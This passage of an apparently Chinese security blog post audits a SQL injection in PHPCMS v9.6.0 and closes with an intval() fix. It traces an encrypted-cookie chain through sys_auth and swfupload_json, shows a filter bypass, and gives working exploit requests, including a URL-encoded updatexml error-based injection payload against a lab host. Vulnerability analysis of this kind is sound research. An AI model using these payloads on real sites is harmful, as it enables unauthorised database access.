+</span></span><span class="line"><span class="cl">if(isset($i)) $i = $id = intval($i);</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>unset 注销变量 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;，&quot; used in math mode [unicodeTextInMathMode] at position 2: i，̲在后面 if 条件检验，此时将…" style="color:#ff4949">i，在后面 if 条件检验，此时将会 intval 后的 </span>i 赋值给 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;，&quot; used in math mode [unicodeTextInMathMode] at position 3: id，̲如果成功则注入肯定行不通，但是…" style="color:#ff4949">id，如果成功则注入肯定行不通，但是 </span>i 都被注销了，这里存在无效条件检验
+这样我们就能肆意玩弄 parse_str，传入 a_k=payload，将 payload 进行 URL 编码以免 &amp; 影响 HTTP 解析
+但现在问题来了，$a_k 还经过执行一次 sys_auth()，我们得看看这个方法是做什么的</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">#phpcms/libs/functions/global.func.php
+</span></span><span class="line"><span class="cl">function sys_auth($string, $operation = &#39;ENCODE&#39;, $key = &#39;&#39;, $expiry = 0) {
+</span></span><span class="line"><span class="cl">    $ckey_length = 4;
+</span></span><span class="line"><span class="cl">    // 使用配置文件中的 auth_key，如果没有传入$key
+</span></span><span class="line"><span class="cl">    $key = md5($key != &#39;&#39; ? $key : pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;));
+</span></span><span class="line"><span class="cl">    $keya = md5(substr($key, 0, 16)); // 密钥前半部分
+</span></span><span class="line"><span class="cl">    $keyb = md5(substr($key, 16, 16)); // 密钥后半部分
+</span></span><span class="line"><span class="cl">    // $keyc 为随机密钥片段（编码时生成，解码时从字符串开头取出）
+</span></span><span class="line"><span class="cl">    $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // 组合最终的加密 key
+</span></span><span class="line"><span class="cl">    $cryptkey = $keya.md5($keya.$keyc);
+</span></span><span class="line"><span class="cl">    $key_length = strlen($cryptkey);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // 如果是解码，先base64解码；如果是编码，拼接过期时间 + 校验摘要 + 原始字符串
+</span></span><span class="line"><span class="cl">    $string = $operation == &#39;DECODE&#39;
+</span></span><span class="line"><span class="cl">        ? base64_decode(strtr(substr($string, $ckey_length), &#39;-_&#39;, &#39;+/&#39;))
+</span></span><span class="line"><span class="cl">        : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+</span></span><span class="line"><span class="cl">    $string_length = strlen($string);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    $result = &#39;&#39;;
+</span></span><span class="line"><span class="cl">    $box = range(0, 255); // 初始化 0-255 数组
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    $rndkey = array();
+</span></span><span class="line"><span class="cl">    // 生成密钥的数组
+</span></span><span class="line"><span class="cl">    for($i = 0; $i &lt;= 255; $i++) {
+</span></span><span class="line"><span class="cl">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // 类似 RC4 的密钥调度算法
+</span></span><span class="line"><span class="cl">    for($j = $i = 0; $i &lt; 256; $i++) {
+</span></span><span class="line"><span class="cl">        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+</span></span><span class="line"><span class="cl">        $tmp = $box[$i];
+</span></span><span class="line"><span class="cl">        $box[$i] = $box[$j];
+</span></span><span class="line"><span class="cl">        $box[$j] = $tmp;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // 加解密过程（异或运算）
+</span></span><span class="line"><span class="cl">    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+</span></span><span class="line"><span class="cl">        $a = ($a + 1) % 256;
+</span></span><span class="line"><span class="cl">        $j = ($j + $box[$a]) % 256;
+</span></span><span class="line"><span class="cl">        $tmp = $box[$a];
+</span></span><span class="line"><span class="cl">        $box[$a] = $box[$j];
+</span></span><span class="line"><span class="cl">        $box[$j] = $tmp;
+</span></span><span class="line"><span class="cl">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if($operation == &#39;DECODE&#39;) {
+</span></span><span class="line"><span class="cl">        // 验证有效期和完整性
+</span></span><span class="line"><span class="cl">        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0)
+</span></span><span class="line"><span class="cl">            &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+</span></span><span class="line"><span class="cl">            return substr($result, 26); // 返回真正的解密结果
+</span></span><span class="line"><span class="cl">        } else {
+</span></span><span class="line"><span class="cl">            return &#39;&#39;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    } else {
+</span></span><span class="line"><span class="cl">        // 编码后拼接 keyc，并替换 base64 字符
+</span></span><span class="line"><span class="cl">        return $keyc.rtrim(strtr(base64_encode($result), &#39;+/&#39;, &#39;-_&#39;), &#39;=&#39;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>即使读不懂也没关系，完全可以把它当做一个封装好的黑盒，思维和黑盒测试一样，扒出来单独测试，丢一些参数进去，看看它是如何运行的
+简单来说，该方法就是内置的加解密函数，加密解密的关键取决于密钥 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;而&quot; used in math mode [unicodeTextInMathMode] at position 5: key
+而̲此时 " style="color:#ff4949">key
+而此时 </span>a_k = sys_auth(<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;传&quot; used in math mode [unicodeTextInMathMode] at position 60: …,&#x27;auth_key&#x27;)); 传̲入 " style="color:#ff4949">a_k, &#x27;DECODE&#x27;, pc_base::load_config(&#x27;system&#x27;,&#x27;auth_key&#x27;)); 传入 </span>operation = &lsquo;DECODE&rsquo; 即解密，读取配置文件 system.php 中的 auth_key 来解密，而这个 auth_key 密钥每个环境都不一样，攻击者在生产环境是不可能隔空读取到服务器的密钥来进行加密的
+也就是说，直接本地加密不成，现在需要一个方法，通过服务器自身前后端交互来得到加密后字符串
+全局检索一下 sys_auth 还有在哪里被调用
+<figure>
+  <img src="file-20250729111429212.png" alt="" loading="lazy"></figure>
+</p>
+<p>在 phpsso_server/phpcms/libs/classes/param.class.php 中有一个符合我们要求的，先设置键名，后将 sys_auth 加密后的字符串作为键值给 setcookie() 执行，这是 PHP 内置方法，作用是发送 Cookie 给前端用户，这里发送的就是加密后的值</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public static function set_cookie($var, $value = &#39;&#39;, $time = 0) {
+</span></span><span class="line"><span class="cl">		$time = $time &gt; 0 ? $time : ($value == &#39;&#39; ? SYS_TIME - 3600 : 0);
+</span></span><span class="line"><span class="cl">		$s = $_SERVER[&#39;SERVER_PORT&#39;] == &#39;443&#39; ? 1 : 0;
+</span></span><span class="line"><span class="cl">		$var = pc_base::load_config(&#39;system&#39;,&#39;cookie_pre&#39;).$var;
+</span></span><span class="line"><span class="cl">		$_COOKIE[$var] = $value;
+</span></span><span class="line"><span class="cl">		if (is_array($value)) {
+</span></span><span class="line"><span class="cl">			foreach($value as $k=&gt;$v) {
+</span></span><span class="line"><span class="cl">				setcookie($var.&#39;[&#39;.$k.&#39;]&#39;, sys_auth($v, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">		} else {
+</span></span><span class="line"><span class="cl">			setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>全局查找哪里调用了 set_cookie，注意这个类方法不能随意了，必须是 application 能调用到的类文件中的
+<figure>
+  <img src="file-20250729113848063.png" alt="" loading="lazy"></figure>
+</p>
+<p>在 phpcms/modules/attachment/attachments.php 发现一个设置 swfupload 上传的 json 格式 cookie 的方法。这里进行了简单的字符串过滤，可以用类似双写的手法绕过</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function swfupload_json() {  
+</span></span><span class="line"><span class="cl">    $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);  
+</span></span><span class="line"><span class="cl">    $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));  
+</span></span><span class="line"><span class="cl">		  =&gt;
+</span></span><span class="line"><span class="cl">			function safe_replace($string) {  
+</span></span><span class="line"><span class="cl">				//过滤
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;&#34;&#39;,&#39;&amp;quot;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#34;&#39;&#34;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;&#34;&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#34;{&#34;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">			    return $string;  
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">    $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));  
+</span></span><span class="line"><span class="cl">    $json_str = json_encode($arr);  
+</span></span><span class="line"><span class="cl">    $att_arr_exist = param::get_cookie(&#39;att_json&#39;);  
+</span></span><span class="line"><span class="cl">    $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);  
+</span></span><span class="line"><span class="cl">    if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {  
+</span></span><span class="line"><span class="cl">       return true;  
+</span></span><span class="line"><span class="cl">    } else {  
+</span></span><span class="line"><span class="cl">       $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;  
+</span></span><span class="line"><span class="cl">       param::set_cookie(&#39;att_json&#39;,$json_str);  
+</span></span><span class="line"><span class="cl">       return true;           
+</span></span><span class="line"><span class="cl">    }  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>但进行了 JSON 格式转换 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mi>s</mi><mi>o</mi><msub><mi>n</mi><mi>s</mi></msub><mi>t</mi><mi>r</mi><mo>=</mo><mi>j</mi><mi>s</mi><mi>o</mi><msub><mi>n</mi><mi>e</mi></msub><mi>n</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">json_str = json_encode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">so</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">so</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mord mathnormal">co</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span>arr); 有关系么？上面已经分析过 PHP 特性，parse_str 是不介意 JSON 格式的，只要我们传入中带有 &amp; 就能识别
+到此为止攻击链似乎要闭合了，attachments.php::swfupload_json() 拿到加密字符串，传给 down.php::init() 进行变量覆盖以期 SQL 注入，不过还有一些限制需要达成或绕过。
+在 attachments 的构造方法中有登录校验，通过 Cookie 判断是否登录
+<figure>
+  <img src="file-20250729120246723.png" alt="" loading="lazy"></figure>
+</p>
+<p>这里的一些字段如 _userid 是 phpcms 设置的登录凭证，会在用户成功登录后（无论是 WAP、PC 会员中心、SSO 单点登录接口）自动设置，我们只需要登录 PC 会员中心即可
+除此之外直接访问 WAP/index.php 同样能拿到这些字段，只不过 wap 会麻烦一些，需要发包的同时手动将凭证加在 POST 中，程序会用 sys_auth($_POST[&lsquo;userid_flash&rsquo;],&lsquo;DECODE&rsquo;) 解码接收</p>
+<h2 class="heading-element" id="漏洞验证"><span>漏洞验证</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先预计构造 &lsquo;and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://192.168.43.169:8089/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=%27%61%6e%64%20%75%70%64%61%74%65%78%6d%6c%28%31%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%28%73%65%6c%65%63%74%20%75%73%65%72%28%29%29%2c%30%78%37%65%29%2c%31%29%23
+</span></span><span class="line"><span class="cl">//经测试，src通过URL编码也可以绕过</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250729123923512.png" alt="" loading="lazy"></figure>
+</p>
+<p>拿到 att_json 后向 down.php 发包</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?m=content&amp;c=down&amp;a=init&amp;a_k=b7a88ed6OU13MyCa8X33qGD8Y9WGLJyHlu3TKMG2PpR6_y8d6TUoQYHig5JY_xv2rMKUZwd5GTK3gQSXHB9OSiN0mmCI0TOsr2luk1u7E0E6CxzjhHCAY8eeQmDEY4iYPdjLbAeWcw93RBIvjBQZiufYIbJL75d4LgLkhh0Z7s_Ln_vojUdD4aYvFPjv0bg3CXifaTXJ883JhfZnPBOS6ftAJ79pubfpV0ujqYgdeCVS0s55CCZD3eRrhVtuj3fRZiy-R9aQvXnexvNhI6zhuoaEmPJFsgS15GEuv-M6xeRaSg&amp;XDEBUG_SESSION_START=18200
+</span></span><span class="line"><span class="cl">//注：这个att_json是根据服务器存储密钥来加密得到的字符串，每个密钥不一样，需要调用attachments::swfupload_json手动拿到</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>完成报错注入漏洞利用，如果生产环境属于无报错回显，还可以通过延迟注入
+<figure>
+  <img src="file-20250729123058821.png" alt="" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="漏洞修复"><span>漏洞修复</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>漏洞根源是 $id 被直接拼接在数据库语句中执行，而这个 id 预计在数据库中应该是个数字，所以强制 intval() 应该就可以拦截了
+<figure>
+  <img src="file-20250729123710013.png" alt="" loading="lazy"></figure>
+</p>
+<p>再次发包
+<figure>
+  <img src="file-20250729123900380.png" alt="" loading="lazy"></figure>
+</p>
+<p>PS. 又掌握一个漏洞形成的方式，耶乎？</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/sql-injection/" class="post-footer-tag-link" title="Tags - SQL Injection">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>SQL Injection</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" data-title="PHPCMSv9.6.0 SQL注入漏洞分析" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="SQL Injection"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" data-hashtag="SQL Injection"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" data-title="PHPCMSv9.6.0 SQL注入漏洞分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/phpcmsv9-mvc%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9 MVC模式学习</div>
+          </div>
+        </a><a href="/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9.6.1-2 任意文件下载漏洞分析</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#全局分析">全局分析</a>
+      <ul>
+        <li><a href="#数据库分析">数据库分析</a></li>
+        <li><a href="#php-特性分析">PHP 特性分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#审计">审计</a>
+      <ul>
+        <li><a href="#代码审计">代码审计</a></li>
+        <li><a href="#漏洞验证">漏洞验证</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞修复">漏洞修复</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
